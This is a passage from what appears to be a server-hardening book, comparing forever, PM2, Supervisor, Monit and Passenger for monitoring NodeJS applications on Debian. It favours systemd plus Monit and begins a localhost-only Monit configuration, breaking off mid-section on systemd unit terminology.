All the following offerings that I have evaluated, target different scenarios. I have listed the pros and cons for each of them and where I think they fit into a potential solution to monitor your web applications (I am leaning toward NodeJS) and make sure they keep running in a healthy state. I have listed the [goals](#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals) I was looking to satisfy.

For me I have to have a good knowledge of the landscape before I commit to a decision and stand behind it. I like to know I have made the best decision based on all the facts that are publicly available. Therefore, as always, it is my responsibility to make sure I have done my research in order to make an informed and ideally best decision possible. I am pretty sure my evaluation was un-biased, as I had not used any of the offerings other than [forever](#vps-countermeasures-lack-of-visibility-proactive-monitoring-forever) before.

I looked at quite a few more than what I have detailed below, but the following candidates I felt were worth spending some time on.

Keep in mind, that everyones requirements will be different, so rather than tell you which to use because I do not know your situation, I have listed the attributes (positive, negative and neutral) that I think are worth considering when making this choice. After the evaluation we make some decisions and start the [configuration](#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit) of the chosen offerings.

##### Evaluation Criteria

1. Who is the creator. I favour teams rather than individuals, because the strength, ability to be side-tracked, and affected by external influences is greater on individuals as compared to a team. If an individual moves on, where does that leave the product? With that in mind, there are some very passionate and motivated individuals running very successful projects.
2. Does it do what we need it to do? [Goals](#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals) address this.
3. Do I foresee any integration problems with other required components, and how difficult are the relationships likely to be?
4. Cost in money. Is it free, as in free beer? I usually gravitate toward free software. It is usually an easier sell to clients and management. Are there catches once you get further down the road? Usually open source projects are marketed as is, so although it costs you nothing up front, what is it likely to cost in maintenance? Do you have the resources to support it?
5. Cost in time. Is the set-up painful?
6. How well does it appear to be supported? What do the users say?
7. Documentation. Is there any / much? What is its quality? Is the User Experience so good, that little documentation is required?
8. Community. Does it have an active one? Are the users getting their questions answered satisfactorily? Why are the unhappy users unhappy (do they have a valid reason)?
9. Release schedule. How often are releases being made? When was the last release? Is the product mature, does it need any work?
10. Gut feeling, Intuition. How does it feel. If you have experience in making these sorts of choices, lean on it. Believe it or not, this may be the most important criteria for you.

The following tools were my choice based on the above criterion.

##### Goals {#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals}

1. Application should start automatically on system boot
2. Application should be re-started if it dies or becomes unresponsive
3. The person responsible for the application should know if a troganised version of your application is swapped in, or even if your file time-stamps have changed
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy (Nginx, node-http-proxy, Tinyproxy, Squid, Varnish, etc)
    2. Clustering and providing load balancing for your single threaded application
    3. Visibility of [application statistics](#vps-countermeasures-lack-of-visibility-statistics-graphing) as we discuss a little later.
5. Enough documentation to feel comfortable consuming the offering
6. The offering should be production ready. This means: mature with a security conscious architecture and features, rather than some attempt of security retrofitted somewhere down the track. Do the developers think and live security, thus bake the concept in from the start?

##### Sysvinit, [Upstart](http://upstart.ubuntu.com/), [systemd](https://freedesktop.org/wiki/Software/systemd/) & [Runit](http://smarden.org/runit/) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit}

You will have one of these running on your standard GNU/Linux box.

These are system and service managers for Linux. Upstart and the later systemd were developed as replacements for the traditional init daemon (Sysvinit), which all depend on init. Init is an essential package that pulls in the default init system. In Debian, starting with Jessie, [systemd](https://wiki.debian.org/systemd) is your default system and service manager.

There is some helpful info on the [differences](https://doc.opensuse.org/documentation/html/openSUSE_122/opensuse-reference/cha.systemd.html) between Sysvinit and systemd, links in the attributions chapter.

{#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit-systemd}
**systemd**  

As I have systemd installed out of the box on my test machine (Debian Stretch), I will be using this for my set-up.

**Documentation**

There is a well written [comparison](http://www.tuicool.com/articles/qy2EJz3) with Upstart, systemd, Runit and even Supervisor.

Running the likes of the below commands will provide some good details on how these packages interact with each other:

{linenos=off, lang=bash}
    aptitude show sysvinit
    aptitude show systemd
    # and any others you think of

These system and service managers all run as `PID 1` and start the rest of your system. Your Linux system will more than likely be using one of these to start tasks and services during boot, stop them during shutdown and supervise them while the system is running. Ideally you are going to want to use something higher level to look after your NodeJS application(s). See the following candidates.

##### [forever](https://github.com/foreverjs/forever) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-forever}

and its [web UI](https://github.com/FGRibreau/forever-webui) can run any kind of script continuously (whether it is written in NodeJS or not). This was not always the case though. It was originally targeted toward keeping NodeJS applications running.

Requires NPM to [install globally](https://www.npmjs.com/package/forever). We already have a package manager on Debian and all other main-stream Linux distros. Even Windows has package managers. Installing NPM just adds more attack surface area. Unless it is essential, I would rather do without NPM on a production server where we are actively working to [reduce the installed package count](#vps-countermeasures-disable-remove-services-harden-what-is-left) and [disable](#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim) everything else we can. We could install forever on a development box and then copy to the production server, but it starts to turn the simplicity of a node module into something not as simple, which then makes native offerings such as [Supervisor](#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor), [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) and even [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger) look even more attractive.

**[Does it Meet Our Goals](#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals)**

1. Not without an extra script. Crontab or similar
2. The application will be re-started if it dies, but if its response times go up, forever is not going to help. It has no way of knowing.
3. forever provides no file integrity or times-tamp checking, so there is nothing stopping your application files being swapped for trojanised counterfeits with forever
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: I do not see a problem
    2. Integrate NodeJS’s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing
    3. Visibility of application statistics could be added later with the likes of [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) or something else, but if you used Monit, then there would not really be a need for forever, as Monit does the little that forever does and is capable of so much more, but is not pushy on what to do and how to do it. All the behaviour is defined with quite a nice syntax in a config file or as many as you like.
5. There is enough documentation to feel comfortable consuming forever, as forever does not do a lot, which is not a bad trait to have
6. The code it self is probably production ready, but I have heard quite a bit about stability issues. You are also expected to have NPM installed (more attack surface in the form of an application whos sole purpose is to install more packages, which goes directly against what we are trying to achieve by minimising the attack surface) when we already have native package managers on the server(s).

**Overall Thoughts**

For me, I am looking for a tool set that is a little smarter, knows when the application is struggling and when someone has tampered with it. Forever does not satisfy the requirements. There is often a balancing act between not doing enough and doing too much. If the offering "can" do to much but does not actually do it (get in your way), then it is not so bad, as you do not have to use all the features. In saying that, it is extra attack surface area that can and will be exploited, it is just a matter of time.

##### [PM2](http://pm2.keymetrics.io/)

Younger than forever, but seems to have quite a few more features. I am not sure about production ready though. Let us elaborate.

I prefer the dark cockpit approach from my monitoring tools. What I mean by that is, I do not want to be told that everything is OK all the time. I only want to be notified when things are not OK. PM2 provides a display of memory and cpu usage of each app with `pm2 monit`, I do not have the time to sit around watching statistics that do not need to be watched and most system administrators do not either, besides, when we do want to do this, we have perfectly good native tooling that system administrators are comfortable using. Amongst the list of [commands that PM2 provides](https://github.com/Unitech/pm2#commands-overview), most of this functionality can be performed by native tools, so I am not sure what benefit this adds.

PM2 also seems to [provide logging](https://github.com/Unitech/pm2#log-facilities). My applications provide their [own logging](#web-applications-countermeasures-lack-of-visibility-insufficient-logging) and we have the [systems logging](#vps-countermeasures-lack-of-visibility-logging-and-alerting) which provides aggregates and singular logs, so again I struggle to see what PM2 is offering here that we do not already have.

As mentioned on the [github](https://github.com/Unitech/pm2) README: “_PM2 is a production process manager for Node.js applications with a built-in load balancer_“. This “Sounds” and at the initial glance looks shiny. Very quickly you should realise there are a few security issues you need to be aware of though.

The word “production” is used but it requires NPM to install globally. We already have a package manager on Debian and all other main-stream Linux distros. As previously mentioned, installing NPM adds unnecessary attack surface area. Unless it is essential and it should not be, we really do not want another application whos sole purpose is to install additional attack surface in the form of extra packages. NPM contains a huge number of packages, that we really do not want access to on a production server facing the internet. We could install PM2 on a development box and then copy to the production server, but it starts to turn the simplicity of a node module into something not as simple, which then, as does forever, makes offerings like [Supervisor](#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor), [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) and even [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger) look even more attractive.

At the time of writing this, PM2 is about four years old with about 440 open issues on github, most quite old, with 29 open pull requests.

Yes, it is very popular currently. That does not tell me it is ready for production though. It tells me the marketing is working.

"[Is your production server ready for PM2](https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md#is-my-production-server-ready-for-pm2)?" That phrase alone tells me the mind-set behind the project. I would much sooner see it worded the other way around. Is PM2 ready for my production server? Your production server(s) are what you have spent time hardening, I am not personally about to compromise that work by consuming a package that shows me no sign of up-front security considerations in the development of this tool. You are going to need a development server for this, unless you honestly want development tools installed on your production server (NPM, git, build-essential and NVM) on your production server? Not for me or my clients thanks.

If you have considered the above concerns and can justify adding the additional attack surface area, check out the features if you have not already.

**Features that Stand Out**

They are also listed on the github repository. Just beware of some of the caveats. Like for the [load balancing](https://github.com/Unitech/pm2#load-balancing--0s-reload-downtime): “_we recommend the use of node#0.12.0+ or node#0.11.16+. We do not support node#0.10.*'s cluster module anymore_”. 0.11.16 is unstable, but hang-on, I thought PM2 was a “production” process manager? OK, so were happy to mix unstable in with something we label as production?

On top of NodeJS, PM2 will run the following scripts: bash, python, ruby, coffee, php, perl.

After working through the offered features, I struggled to find value in features that were not already offered natively as part of the GNU/Linux Operation System.

PM2 has [Start-up Script Generation](https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md#startup-script), which sounds great, but if using systemd as we do below, then it is just a few lines of config for [our unit file](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive). This is a similar process no matter what init system you have out of the box.

**Documentation**

The documentation has nice eye candy which I think helps to sell PM2.

PM2 has what they call an Advanced [Readme](https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md) which at the time of reviewing, didn't appear to be very advanced and had a large collection of broken links.

**Does it Meet Our Goals**

1. The feature exists, unsure of how reliable it is currently though. I personally prefer to [create my own](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive) and test that it is being used by the Operating Systems native init system, that is the same system that starts everything else at boot time. There is nothing more reliable than this.
2. Application should be re-started if it dies should not be a problem. PM2 can also restart your application if it reaches a certain memory or cpu threshold. I have not seen anything around restarting based on response times or other application health issues though.
3. PM2 provides no file integrity or times-tamp checking, so there is nothing stopping your application files being swapped for trojanised counterfeits with PM2
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: I do not see a problem
    2. [Clustering](http://pm2.keymetrics.io/docs/usage/cluster-mode/) and [load-balancing](https://github.com/Unitech/pm2#load-balancing--zero-second-downtime-reload) is integrated.
    3. PM2 can provide a small collection of viewable statistics, nothing that can not be easily seen by native tooling though, it also offers KeyMetrics integration, except you have to sign up and [pay $29 per host per month](https://keymetrics.io/pricing/) for it. Personally I would rather pay $0 for something with more features that is way more mature and also native to the Operating System. You will see this with [Monit](https://mmonit.com/monit/) soon.
5. There is reasonable official documentation for the age of the project. The community supplied documentation has caught up. After working through all of the offerings and edge-cases, I feel as I usually do with NodeJS projects. The documentation does not cover all the edge-cases and the development itself misses edge cases.
6. I have not seen much that would make me think PM2 is production ready. It may work well, but I do not see much thought in terms of security gone into this project. It has not wow'd me.

**Overall Thoughts**

For me, the architecture does not seem to be heading in the right direction to be used on a production internet facing web server, where less is better, unless the functionality provided is truly unique and adds more value than the extra attack surface area removes. I would like to see this change, but I do not think it will, the culture is established.

A> The following are better suited to monitoring and managing your applications. Other than [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger), they should all be in your repositories, which means trivial installs and configurations.

##### [Supervisor](https://github.com/Supervisor/supervisor) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor}

Supervisor is a process manager with a lot of features and a higher level of abstraction than the likes of the above mentioned [Sysvinit, upstart, systemd, Runit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit), etc, so it still needs to be run by an init daemon in itself.

From the [docs](http://supervisord.org/#supervisor-a-process-control-system): “_It shares some of the same goals of programs like [launchd, daemontools, and runit](http://supervisord.org/glossary.html#term-daemontools). Unlike some of these programs, it is not meant to be run as a substitute for init as “process id 1”. Instead it is meant to be used to control processes related to a project or a customer, and is meant to start like any other program at boot time._” Supervisor monitors the [state](http://supervisord.org/subprocess.html#process-states) of processes. Where as a tool like [Monit](https://mmonit.com/monit/#about) can perform so many more types of tests and take what ever actions you define.

It is in the Debian [repositories](https://packages.debian.org/stretch/supervisor) and is a trivial install on Debian and derivatives.

**Documentation**

[Main web site](http://supervisord.org/) (ReadTheDocs)

**Does it Meet Our Goals**

1. Application should start automatically on system boot: Yes, that is what Supervisor does well.
2. Application will be re-started if it dies, or becomes un-responsive. It is often difficult to get accurate up/down status on processes on UNIX. Pid-files often lie. Supervisord starts processes as sub-processes, so it always knows the true up/down status of its children. Your application may become unresponsive or can not connect to its database or any other service/resource it needs to work as expected. To be able to monitor these events and respond accordingly your application can expose a health-check interface, like `GET /healthcheck`. If everything goes well it should return `HTTP 200`, if not then `HTTP 5**` In some cases the restart of the process will solve this issue. [`httpok`](https://superlance.readthedocs.io/en/latest/httpok.html) is a Supervisor event listener which makes `GET` requests to the configured URL. If the check fails or times out, `httpok` will restart the process. To enable `httpok` the [following lines](https://blog.risingstack.com/operating-node-in-production/#isitresponding) have to be placed in `supervisord.conf`:  
  
  {linenos=off, lang=bash}
      [eventlistener:httpok]
      command=httpok -p my-api http://localhost:3000/healthcheck  
      events=TICK_5  
  
3. The person responsible for the application should know if a troganised version of your application is swapped in, or even if your file time-stamps have changed. This is not one of Supervisor's responsibilities.
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: I do not see a problem
    2. Integrate NodeJS’s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. This would be completely separate to supervisor.
    3. Visibility of application statistics could be added later with the likes of Monit or something else. For me, Supervisor does not do enough. Monit does. Plus if you need what Monit offers, then you have to have three packages to think about, or Something like Supervisor, which is not an init system, so it kind of sits in the middle of the ultimate stack. So my way of thinking is, use the init system you already have to do the low level lifting and then something small to take care of everything else on your server that the init system is not really designed for, and Monit does this job really well. Just keep in mind also. This is not based on any bias. I had not used Monit before this exercise. It has been a couple of years since a lot of this was written though and Monit has had a home in my security focussed hosting facility since then. I never look at it or touch it, Monit just lets me know when there are issues and is quiet the rest of the time.
5. Supervisor is a mature product. It has been around since 2004 and is still actively developed. The official and community provided [docs](https://serversforhackers.com/monitoring-processes-with-supervisord) are good.
6. Yes it is production ready. It has proven itself.

**Overall Thoughts**

The documentation is quite good, easy to read and understand. I felt that the config was quite intuitive also. I already had systemd installed out of the box and did not see much point in installing Supervisor as systemd appeared to do everything Supervisor could do, plus systemd is an init system, sitting at the bottom of the stack. In most scenarios you are going to have a Sysvinit or replacement of (that runs with a `PID` of `1`), so in many cases Supervisor although it is quite nice is kind of redundant.

Supervisor is better suited to running multiple scripts with the same runtime, for example a bunch of different client applications running on Node. This can be done with systemd and the others, but Supervisor is a better fit for this sort of thing, PM2 also looks to do a good job of running multiple scripts with the same runtime.

##### [Monit](https://mmonit.com/monit/) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit}

Is a utility for monitoring and managing daemons or similar programs. It is mature, actively maintained, free, open source and licensed with GNU [AGPL](http://www.gnu.org/licenses/agpl.html).

It is in the debian [repositories](https://packages.debian.org/stretch/monit) (trivial install on Debian and derivatives). The home page told me the binary was just under 500kB. The install however produced a different number:

{linenos=off, lang=bash}
    After this operation, 765 kB of additional disk space will be used.

Monit provides an impressive feature set for such a small package.

Monit provides far more visibility into the state of your application and control than any of the offerings mentioned above. It is also generic. It will manage and/or monitor anything you throw at it. It has the right level of abstraction. Often when you start working with a product you find its limitations, and they stop you moving forward, you end up settling for imperfection or you swap the offering for something else providing you have not already invested to much effort into it. For me Monit hit the sweet spot and never seems to stop you in your tracks. There always seems to be an easy to relatively easy way to get any "monitoring -> take action" sort of task done. What I also really like is that moving away from Monit would be relatively painless also, other than what you would miss. The time investment / learning curve is very small, and some of it will be transferable in many cases. It is just config from the control file.

{#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit-features-that-stand-out}
**[Features that Stand Out](https://mmonit.com/monit/#about)**

* Ability to [monitor](http://slides.com/tildeslash/monit#/1) files, [directories](http://slides.com/tildeslash/monit#/23), disks, processes, [programs](http://slides.com/tildeslash/monit#/26), the system, and other hosts.
* Can perform [emergency logrotates](http://slides.com/tildeslash/monit#/21) if a log file suddenly grows too large too fast
* [File Checksum Testing](http://mmonit.com/monit/documentation/monit.html#FILE-CHECKSUM-TESTING). [This](http://slides.com/tildeslash/monit#/22) is good so long as the compromised server has not also had the tool your using to perform your verification (md5sum or sha1sum) modified, whether using the systems utilities or monit provided utilities, which would be common. That is why in cases like this, tools such as [Stealth](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth) can be a good choice to protect your monitoring tools.
* Testing of other attributes like ownership and access permissions. These are good, but again can be [easily modified](#vps-identify-risks-lack-of-visibility).
* Monitoring [directories](http://slides.com/tildeslash/monit#/23) using time-stamp. Good idea, but do not rely solely on this. time-stamps are easily modified with `touch -r`, providing you do it between Monits cycles and you do not necessarily know when they are, unless you have permissions to look at Monits control file. This provides defence in depth though.
* Monitoring [space of file-systems](http://slides.com/tildeslash/monit#/24)
* Has a built-in lightweight HTTP(S) interface you can use to browse the Monit server and check the status of all monitored services. From the web-interface you can start, stop and restart processes and disable or enable monitoring of services. Monit provides [fine grained control](https://mmonit.com/monit/documentation/monit.html#MONIT-HTTPD) over who/what can access the web interface or whether it is even active or not. Again an excellent feature that you can choose to use, or not even have the extra attack surface.
* There is also an aggregator ([m/monit](https://mmonit.com/)) that allows system administrators to monitor and manage many hosts at a time. Also works well on mobile devices and is available at a one off cost (reasonable price) to monitor all hosts.
* Once you install Monit you have to actively enable the http daemon in the `monitrc` in order to run the Monit cli and/or access the Monit http web UI. At first I thought “is this broken?” I could not even run `monit status` (a Monit command). ps told me Monit was running. Then I realised… **it is secure by default**. You have to actually think about it in order to expose anything. It was this that confirmed Monit was one of the tools for me.
* The [Control File](http://mmonit.com/monit/documentation/monit.html#THE-MONIT-CONTROL-FILE)
* Security by default. Just [like SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication-ssh-perms), to protect the security of your control file and passwords the control file must have read-write permissions no more than `0700 (`u=xrw,g=,o=`); Monit will complain and exit otherwise, again, security by default.

**Documentation**

The following was the documentation I used in the same order and I found that the most helpful.

1. [Main web site](https://mmonit.com/monit/)
2. Clean concise [Official Documentation](https://mmonit.com/monit/documentation/monit.html) all on one page with hyper-links
3. Source and links to other [documentation](https://bitbucket.org/tildeslash/monit/src) including a QUICK START guide of about 6 lines
4. [Adding Monit to systemd](https://mmonit.com/wiki/Monit/Systemd)
5. [Release notes](https://mmonit.com/monit/changes/)
6. The monit control file itself has excellent documentation in the form of commented examples. Just uncomment and modify to suite your use case.

**Does it Meet Our Goals**

1. Application can start automatically on system boot
2. Monit has a plethora of different types of tests it can perform and then follow up with actions based on the outcomes. [Http](http://mmonit.com/monit/documentation/monit.html#HTTP) is but one of them.
3. Monit covers this nicely, you still need to be integrity checking Monit though.
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: Yes, I do not see any issues here
    2. Integrate NodeJS’s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. Monit will still monitor, restart and do what ever else you tell it to do.
    3. Monit provides application statistics to look at if that is what you want, but it also goes further and provides directives for you to declare behaviour based on conditions that Monit checks for and can execute.
5. Plenty of official and community supplied documentation
6. Yes it is production ready and has been for many years and is still very actively maintained. It is proven itself. Some extra education around some of the [points](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit-features-that-stand-out) I raised above with some of the security features would be good.

**Overall Thoughts**

There was accepted answer on [Stack Overflow](http://stackoverflow.com/questions/7259232/how-to-deploy-node-js-in-cloud-for-high-availability-using-multi-core-reverse-p) that discussed a pretty good mix and approach to using the right tools for each job. Monit has a lot of capabilities, none of which you must use, so it does not get in your way, as many opinionated tools do and like to dictate how you do things and what you must use in order to do them. I have been using Monit now for several years and just forget that it is even there, until it barks because something is not quite right. Monit allows you to leverage what ever you already have in your stack, it plays very nicely with all other tools. Monit under sells and over delivers. You do not have to install package managers or increase your attack surface other than `[apt-get|aptitude] install monit`. It is easy to configure and has lots of good documentation.

##### Passenger {#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger}

I have looked at Passenger before and it looked quite good then. It still does, with one main caveat. It is trying to do to much. One can easily get lost in the official documentation ([example](http://mmonit.com/wiki/Monit/Installation) of the Monit install (handfull of commands to cover all Linux distributions on one page) vs Passenger [install](https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html#installation) (many pages to get through)).  “_Passenger is a web server and application server, designed to be fast, robust and lightweight. It runs your web applications with the least amount of hassle by taking care of almost all administrative heavy lifting for you._” I would like to see the actual weight rather than just a relative term “lightweight”. To me it does not look light weight. The feeling I got when evaluating Passenger was similar to the feeling produced with my [Ossec evaluation](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec).

The learning curve is quite a bit steeper than all the previous offerings. Passenger has strong opinions that once you buy into could make it hard to use the tools you may want to swap in and out. I am not seeing the [UNIX Philosophy](http://en.wikipedia.org/wiki/Unix_philosophy) here.

If you looked at the Phusion Passenger Philosophy when it was available, seems to have been removed now, you would see some note-worthy comments. “We believe no good software has bad documentation“. If your software is 100% intuitive, the need for documentation should be minimal. Few software products are 100% intuitive, because we only have so much time to develop them. The [comment around](https://github.com/phusion/passenger/wiki/Phusion-Passenger:-Meteor-tutorial#what-passenger-doesnt-do) “the Unix way” is interesting also. At this stage I am not sure this is the Unix way. I would like to spend some time with someone or some team that has Passenger in production in a diverse environment and see how things are working out.

Passenger is not in the Debian repositories, so you would need to add the apt repository.

Passenger is seven years old at the time of writing this, but the NodeJS support is only just over two years old.

**Features that Do Not really Stand Out**

Sadly there were not many that stood out for me.

* The [Handle more traffic](https://www.phusionpassenger.com/handle_more_traffic) marketing material looked similar to [Monit resource testing](http://mmonit.com/monit/documentation/monit.html#RESOURCE-TESTING) but without the detail. If there is something Monit can not do well, it will say “Hay, use this other tool and I will help you configure it to suite the way you want to work. If you do not like it, swap it out for something else” With Passenger it seems to integrate into everything rather than providing tools to communicate loosely. Essentially locking you into a way of doing something that hopefully you like. It also talks about “Uses all available CPU cores“. If you are using Monit you can use the NodeJS cluster module to take care of that. Again leaving the best tool for the job to do what it does best.
* [Reduce maintenance](https://www.phusionpassenger.com/reduce_maintenance)
  * “**_Keep your app running, even when it crashes_**. _Phusion Passenger supervises your application processes, restarting them when necessary. That way, your application will keep running, ensuring that your website stays up. Because this is automatic and builtin, you do not have to setup separate supervision systems like Monit, saving you time and effort._” but this is what we want, we want a separate supervision (monitoring) system, or at least a very small monitoring daemon, and this is what Monit excels at, and it is so much easier to set-up than Passenger. This sort of marketing does not sit right with me.
  * “**_Host multiple apps at once_**. _Host multiple apps on a single server with minimal effort._” If we are talking NodeJS web apps, then they are their own server. They host themselves. In this case it looks like Passenger is trying to solve a problem that does not exist, at least in regards to NodeJS?
* [Improve security](https://www.phusionpassenger.com/improve_security)
  * “**_Privilege separation_**. _If you host multiple apps on the same system, then you can easily run each app as a different Unix user, thereby separating privileges._“. The Monit [documentation](https://mmonit.com/monit/documentation/monit.html#PROGRAM-STATUS-TESTING) says this: “If Monit is run as the super user, you can optionally run the program as a different user and/or group.” and goes on to provide examples how it is done. So again I do not see anything new here. Other than the “Slow client protections” which has side affects, that is it for security considerations with Passenger. Monit has security woven through every aspect of itself.
* What I saw happening here, was a lot of stuff that as a security focussed proactive monitoring tool, was not required. Your mileage may vary.

**[Offerings](https://www.phusionpassenger.com/download)**

Phusion Passenger is a commercial product that has enterprise, custom and open source (which is free and has many features).

**Documentation**

The following was the documentation I used in the same order and I found that the most helpful.

1. NodeJS [tutorial](https://github.com/phusion/passenger/wiki/Phusion-Passenger%3A-Node.js-tutorial), this got me started with how it could work with NodeJS
2. [Main web site](https://www.phusionpassenger.com/)
3. [Documentation and support portal](https://www.phusionpassenger.com/documentation_and_support)
4. [Design and Architecture](https://www.phusionpassenger.com/documentation/Design%20and%20Architecture.html)
5. [User Guide Index](https://www.phusionpassenger.com/library/)
6. [Nginx specific User Guide](https://www.phusionpassenger.com/documentation/Users%20guide%20Nginx.html)
7. [Standalone User Guide](https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html)
8. [Twitter](https://twitter.com/phusion_nl), [blog](https://blog.phusion.nl/)
9. IRC: `#passenger` at `irc.freenode.net`. I was on there for several days. There was very little activity.
10. [Source](https://github.com/phusion/passenger)


**Does it Meet Our Goals**

1. Application should start automatically on system boot. There is no doubt that Passenger goes way beyond this aim.
2. Application should be re-started if it dies or becomes un-responsive. There is no doubt that Passenger goes way beyond this aim.
3. I have not seen Passenger provide any file integrity or time-stamp checking features
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: Passenger provides Integrations into Nginx, Apache and stand-alone (provide your own proxy)
    2. Passenger scales up NodeJS processes and automatically load balances between them
    3. Passenger is advertised as offering easily viewable [statistics](https://www.phusionpassenger.com/identify_and_fix_problems). I have not seen many of them though
5. There is loads of official documentation. Not as much community contributed though.
6. From what I have seen so far, I would say Passenger may be production ready. I would like to see more around how security was baked into the architecture though before I committed to using it in production. I am just not seeing it.

**Overall Thoughts**

I spent quite a while reading the documentation. I just think it is doing to much. I prefer to have stronger single focused tools that do one job, do it well and play nicely with all the other kids in the sand pit. You pick the tool up and it is just intuitive how to use it, and you end up reading docs to confirm how you think it should work. For me, this was not my experience with passenger.

&nbsp;

A> If you are looking for something even more comprehensive, check out [Zabbix](http://en.wikipedia.org/wiki/Zabbix).  
A> If you like to pay for your tools, check out Nagios if you have not already.

At this point it was fairly clear as to which components I would like to use to keep my NodeJS application(s) monitored, alive and healthy along with any other scripts and processes.

Systemd and Monit.

Going with the default for the init system should give you a quick start and provide plenty of power. Plus it is well supported, reliable, feature rich and you can manage anything/everything you want without installing extra packages.

For the next level up, I would choose Monit. I have now used it in production and it has taken care of everything above the init system with a very simple configuration. I feel it has a good level of abstraction, plenty of features, never gets in the way, and integrates nicely into your production OS(s) with next to no friction.

##### Getting Started with Monit {#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit}

So we have installed Monit with an `apt-get install monit` and we are ready to start configuring it.

{linenos=off, lang=bash}
    ps aux | grep -i monit

Will reveal that Monit is running:

{linenos=off, lang=bash}
    /usr/bin/monit -c /etc/monit/monitrc

Now if you issue a `sudo service monit restart`, it will not work as you can not access the Monit CLI due to the httpd not running.

The first thing we need to do is make some changes to the control file (`/etc/monit/monitrc` in Debian). The control file has sensible defaults already. At this stage I do not need a web UI accessible via localhost or any other hosts, but it still needs to be turned on and accessible by at least localhost. [Here is why](http://mmonit.com/monit/documentation/monit.html#MONIT-HTTPD):

"_Note that if HTTP support is disabled, the Monit CLI interface will have reduced functionality, as most CLI commands (such as "monit status") need to communicate with the Monit background process via the HTTP interface. We strongly recommend having HTTP support enabled. If security is a concern, bind the HTTP interface to local host only or use Unix Socket so Monit is not accessible from the outside._"

In order to turn on the httpd, all you need in your control file for that is:

{linenos=off, lang=bash}
    # only accept connection from localhost
    set httpd port 2812 and use address localhost
    # allow localhost to connect to the server and
    allow localhost

If you want to receive alerts via email, then you will need to [configure that](https://mmonit.com/monit/documentation/monit.html#Setting-a-mail-server-for-alert-delivery). Then on reload you should get start and stop events (when you quit).

{linenos=off, lang=bash}
    sudo monit reload

Now if you issue a `curl localhost:2812` you should get the web UIs response of a html page. Now you can start to play with the Monit CLI. Monit can also be seen listening in the `netstat` output [above](#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim) where we disabled and removed services.

Now to stop the Monit background process use:

{linenos=off, lang=bash}
    monit quit

You can find all the arguments you can throw at Monit in the documentaion under [Arguments](https://mmonit.com/monit/documentation/monit.html#Arguments), or just issue:

{linenos=off, lang=bash}
    monit -h # will list all options.

To check the control file for syntax errors:

{linenos=off, lang=bash}
    sudo monit -t

Also keep an eye on your log file which is specified in the control file:  
`set logfile /var/log/monit.log`

Right. So what happens when Monit dies..?...

##### Keep Monit Alive

Now you are going to want to make sure your monitoring tool that can be configured to take all sorts of actions never just stops running, leaving you flying blind. No noise from your servers means all good right? Not necessarily. Your monitoring tool just has to keep running, no ifs or buts about it. So let us make sure of that now.

When Monit is `apt-get install`‘ed on Debian, it gets installed and configured to run as a daemon. This is defined in Monits init script.  
Monits init script is copied to `/etc/init.d/` and the run levels set-up for it upon installation. This means when ever a run level is entered the init script will be run taking either the single argument of `stop` (example: `/etc/rc0.d/K01monit`), or `start` (example: `/etc/rc2.d/S17monit`). Remember we [discussed run levels](#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim) previously?

**systemd to the rescue**

Monit is very stable, but if for some reason it dies, then it will not be [automatically restarted](https://mmonit.com/monit/documentation/monit.html#INIT-SUPPORT) again. In saying that I have never had Monit die on any of my servers being monitored.  
This is where systemd comes in. systemd is installed out of the box on Debian Jessie on-wards. Ubuntu uses Upstart on 14.10 which is similar, Ubuntu 15.04 uses systemd. Both SysV init and systemd can act as drop-in replacements for each other or even work along side of each other, which is the case in Debian Jessie. If you add a unit file which describes the properties of the process that you want to run, then issue some magic commands, the systemd unit file will take precedence over the init script (`/etc/init.d/monit`).

Before we get started, let us get some terminology established. The two concepts in systemd we need to know about are unit and target.

